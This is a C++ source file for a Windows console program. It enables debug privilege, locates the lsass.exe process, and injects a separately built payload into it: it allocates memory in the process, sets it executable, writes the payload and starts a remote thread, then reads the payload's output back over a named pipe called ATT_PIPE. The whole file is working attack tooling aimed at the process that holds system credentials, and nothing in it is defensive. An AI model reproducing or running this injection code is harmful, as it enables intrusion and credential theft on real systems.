// proto2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"

extern "C"
{
BOOL BuildPayloadBuffer( char **theBuffer, int *theLen );
};

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
#ifdef MIDL_PASS
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer;
#else // MIDL_PASS
    PWSTR  Buffer;
#endif // MIDL_PASS
} UNICODE_STRING, *PUNICODE_STRING;

typedef unsigned long NTSTATUS;
typedef LONG KPRIORITY;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH      0xC0000004L

typedef struct _SYSTEM_PROCESSES
{
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	// .. skipping the rest of the struct .. //
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;

#define SystemProcessesAndThreadsInformation 5

DWORD GetExeHandle(const char *process_name);
BOOL EnablePriv (LPCTSTR thePriv);
void ReadAttackThread(HANDLE theWaitEvent);

typedef NTSTATUS (__stdcall *P_ZwQuerySystemInformation)(
		IN DWORD SystemInformationClass,
		IN OUT PVOID SystemInformation,
		IN ULONG SystemInformationLength,
		OUT PULONG ReturnLength
		);

typedef VOID (__stdcall *P_RtlInitUnicodeString)(
		IN OUT PUNICODE_STRING  DestinationString,
		IN PCWSTR  SourceString
		);

P_ZwQuerySystemInformation ZwQuerySystemInformation;
P_RtlInitUnicodeString RtlInitUnicodeString;

void * alloc_in_process( HANDLE theProcessH, DWORD theSize ) 
{ 
	void * aMemP; 
	DWORD numBytes; 
	MEMORY_BASIC_INFORMATION mbi;
	DWORD aThreadID;

	// ----------------------------------------------------
	// we are making a blatant assumption that the address
	// will be the same for the remote process
	// ----------------------------------------------------
	HINSTANCE aModule = GetModuleHandle("kernel32"); 
	void *fp = GetProcAddress(aModule, "ExitThread"); 
	
	HANDLE hThread = CreateRemoteThread( 
							theProcessH, 
							NULL, 
							theSize, /* stack size */ 
							(LPTHREAD_START_ROUTINE) fp, 
							0, 
							CREATE_SUSPENDED, 
							&aThreadID );
	if(hThread) 
	{ 
		/* everything is OK */ 
		CONTEXT aContext; 
		aContext.ContextFlags = CONTEXT_CONTROL; 
		if(!GetThreadContext( hThread, &aContext )) return NULL; 
		if(!VirtualQueryEx( theProcessH, 
						(LPCVOID)(aContext.Esp - 1), 
						&mbi, 
						sizeof(mbi)) ) return NULL; //could be access denied

		aMemP = (void *) mbi.BaseAddress; 

		// write the thread handle at base of page 
		WriteProcessMemory( theProcessH, 
							aMemP, 
							&hThread, 
							sizeof(hThread), 
							&numBytes); 

		return((void *) ((PHANDLE) aMemP + 1)); 
	} 
	return NULL; 
} 


int main(int argc, char* argv[])
{
	// create a remote thread in services.exe
	HANDLE hRemoteProcess;
	BOOL fOK = FALSE;
	DWORD dwProcessId;

	if(!EnablePriv(SE_DEBUG_NAME)) return 0;

	dwProcessId = GetExeHandle("lsass.exe");
	if(!dwProcessId) dwProcessId = GetExeHandle("LSASS.EXE");
	
	if(dwProcessId)
	{
		DWORD old_protection;
		DWORD num_bytes_tranferred;
		
		HANDLE hThread;
		DWORD thread_id;

		// we need to build the fusion payload here
		char *aPayloadBuffer;
		int aPayloadLen;
		if(BuildPayloadBuffer( &aPayloadBuffer, &aPayloadLen ))
		{
			hRemoteProcess = OpenProcess(	
									PROCESS_CREATE_THREAD |
									PROCESS_VM_OPERATION  |
									PROCESS_QUERY_INFORMATION |
									PROCESS_VM_WRITE,
									FALSE,
									dwProcessId);

			/////////////////////////////////////////////////////////////////////
			// begin read thread
			//
			/////////////////////////////////////////////////////////////////////
			DWORD someDword;
			HANDLE hEvent = CreateEvent( NULL, 0, 0, NULL);
			HANDLE hReadThread = CreateThread(	NULL, 
												0, 
												(LPTHREAD_START_ROUTINE) ReadAttackThread,
												hEvent,
												0,
												&someDword );
			if(!hReadThread)
			{
				//error
				return 0;
			}

			if(WaitForSingleObject( hEvent, 10000 ) != ERROR_SUCCESS )
			{
				// error - could not create pipe
				return 0;
			}


			void *pRemoteMemory = alloc_in_process( hRemoteProcess, aPayloadLen );

			if(pRemoteMemory)
			{
				// we need to make sure the remote memory is writable 
				VirtualProtectEx(	hRemoteProcess, 
									pRemoteMemory, 
									aPayloadLen, 
									PAGE_EXECUTE_READWRITE, 
									&old_protection); 

				// and then we inject it 
				WriteProcessMemory( 
									hRemoteProcess, 
									pRemoteMemory, 
									(void *) aPayloadBuffer, /* the address of our first function */ 
									aPayloadLen, 
									&num_bytes_tranferred); 

				// now start the remote thread and wait for it to exit 
				hThread = CreateRemoteThread( 
									hRemoteProcess, 
									NULL, 
									0, 
									(LPTHREAD_START_ROUTINE) pRemoteMemory, 
									NULL, /* whatever you want to pass to thread */ 
									0, 
									&thread_id); 
				
				puts("Launching remote thread now");
				ResumeThread(hThread);  
				// remote thread is started - monitor listening on local thread
				
				WaitForSingleObject(hReadThread, INFINITE);
				
				puts("Remote thread has finished execution");
			}
			else
			{
				puts("Error launching remote thread");
			}
		}
		else
		{
			puts("Error building remote payload");
		}
	}
	return 0;
}


DWORD GetExeHandle(const char *process_name)
{
	DWORD aProcessId = NULL;
	//////////////////////////////////////////////////////////////
	// get DLL entry points
	//////////////////////////////////////////////////////////////
	if( !(RtlInitUnicodeString = 
		(P_RtlInitUnicodeString) GetProcAddress( GetModuleHandle("ntdll.dll"),
		"RtlInitUnicodeString" )) )
		return NULL;
		
	if( !(ZwQuerySystemInformation = 
		(P_ZwQuerySystemInformation) GetProcAddress( GetModuleHandle("ntdll.dll"),
		"ZwQuerySystemInformation" )) ) 
		return NULL;
	
	
	//////////////////////////////////////////////////////////////
	// we allocate the buffer for the system query in chunks
	// until it either succeeds, or we get too big
	//////////////////////////////////////////////////////////////
	ULONG aReturnLength = 0;
	ULONG numStructs = 0x100;
	
	PSYSTEM_PROCESSES aSystemInfoBuffer = new SYSTEM_PROCESSES[numStructs];
	while( ZwQuerySystemInformation(SystemProcessesAndThreadsInformation,
									aSystemInfoBuffer,
									numStructs * sizeof *aSystemInfoBuffer,
									&aReturnLength)
									== STATUS_INFO_LENGTH_MISMATCH)
	{	
		delete[] aSystemInfoBuffer;
		aSystemInfoBuffer = new SYSTEM_PROCESSES[ numStructs += numStructs * 2 ];
	}
	
	///////////////////////////////////////////////////////////////////
	// aSystemInfoBuffer has our process list in it
	///////////////////////////////////////////////////////////////////
	PSYSTEM_PROCESSES pProcList = (PSYSTEM_PROCESSES)aSystemInfoBuffer;
	while(pProcList->NextEntryDelta)
	{
		char _c[255];

		pProcList = PSYSTEM_PROCESSES((PCHAR(pProcList) + pProcList->NextEntryDelta));
		
		_snprintf(_c, 253, "%ls", pProcList->ProcessName.Buffer);
		if(!strcmp(_c, process_name))
		{
			aProcessId = pProcList->ProcessId;
			break;
		}
	}
	
	delete[] aSystemInfoBuffer;
	return aProcessId;
}

BOOL EnablePriv (LPCTSTR thePriv)
{
	BOOL bRet = FALSE;

    HANDLE hToken = 0;
    DWORD dwErr = 0;
    TOKEN_PRIVILEGES newPrivs;

    if (!OpenProcessToken (GetCurrentProcess (),
                           TOKEN_ADJUST_PRIVILEGES,
                           &hToken))
    {
        dwErr = GetLastError ();
        fprintf (stderr, "Unable to open process token: %08x\n", dwErr);
    }
	else if (!LookupPrivilegeValue (	NULL, thePriv,
										&newPrivs.Privileges[0].Luid))
    {
        dwErr = GetLastError ();
        fprintf (stderr, "Unable to lookup privilege: %08x\n", dwErr);
    }
	else
	{
		newPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		newPrivs.PrivilegeCount = 1;
    
		if (!AdjustTokenPrivileges (hToken, FALSE, &newPrivs, 0, NULL, NULL))
		{
			dwErr = GetLastError ();
			fprintf (stderr, "Unable to adjust token privileges: %08x\n", dwErr);
		}
		else bRet = TRUE;
	}

    if (hToken)
        CloseHandle (hToken);

    return bRet;
}

void ReadAttackThread(HANDLE theWaitEvent)
{
	HANDLE aPipeH;

	// create the named pipe
	aPipeH = CreateNamedPipe(	"\\\\.\\pipe\\ATT_PIPE",
								PIPE_ACCESS_INBOUND |
								FILE_FLAG_WRITE_THROUGH,
								PIPE_TYPE_BYTE | PIPE_WAIT,
								1, 1024, 1024,
								10000, NULL);
	if(NULL == aPipeH)
	{
		//error
		return;
	}

	SetEvent( theWaitEvent );
	if(ConnectNamedPipe( aPipeH, NULL))
	{
		BYTE aBuffer[1024+1];
		DWORD aNumberRead;
		DWORD anErr = ERROR_SUCCESS;

		do
		{
			if(ReadFile(	aPipeH,
							aBuffer,
							sizeof(aBuffer) - 1,
							&aNumberRead,
							NULL))
			{
				aBuffer[aNumberRead] = NULL;
				// print this out....
			}
			else
			{
				anErr = GetLastError();
			}

		}
		while(ERROR_BROKEN_PIPE != anErr);

	}
	else
	{
		//error
		return;
	}
	DisconnectNamedPipe(aPipeH);
	CloseHandle(aPipeH);
	return;
}
		
